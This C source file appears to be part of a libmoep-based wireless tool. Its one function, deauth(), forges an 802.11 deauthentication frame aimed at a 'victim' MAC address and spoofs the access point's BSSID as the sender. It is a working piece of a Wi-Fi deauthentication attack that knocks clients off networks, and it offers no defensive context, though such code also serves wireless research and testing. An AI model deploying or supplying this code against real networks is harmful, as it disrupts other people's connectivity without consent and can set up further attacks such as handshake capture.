#include <unistd.h>
#include <moepcommon/util.h>

#include "deauth.h"
#include "../global.h"
#include "../frametypes.h"
#include "../radiotap.h"
#include "../cfg.h"

extern struct cfg cfg;

moep_frame_t
deauth(const u8 *victim, const u8 *bssid)
{
	moep_frame_t frame;
	struct moep80211_radiotap *rt;
	struct ieee80211_hdr_gen *hdr;
	struct ieee80211_deauth payload;

	frame = moep_frame_ieee80211_create();

	if (!(rt = moep_frame_radiotap(frame))) {
		LOG(LOG_ERR, "moep_frame_ieee80211_hdr() failed");
		goto fail;
	}
	if (!(hdr = moep_frame_ieee80211_hdr(frame))) {
		LOG(LOG_ERR, "moep_frame_ieee80211_hdr() failed");
		goto fail;
	}

	memset(hdr, 0, sizeof(*hdr));

	hdr->frame_control  = htole16(IEEE80211_FTYPE_MGMT);
	hdr->frame_control |= htole16(IEEE80211_STYPE_DEAUTH);
	memcpy(hdr->addr1, victim, IEEE80211_ALEN);
	memcpy(hdr->addr2, bssid, IEEE80211_ALEN);
	memcpy(hdr->addr3, bssid, IEEE80211_ALEN);

	payload.reason = 0x07;
	payload.vendor_specific = rand() & 0xff;

	if (!(moep_frame_set_payload(frame, (u8 *)&payload, sizeof(payload)))) {
		LOG(LOG_ERR, "moep_frame_set_payload() failed");
		goto fail;
	}

	radiotap_set_defaults(rt);

	return frame;

	fail:
	moep_frame_destroy(frame);
	return NULL;
}



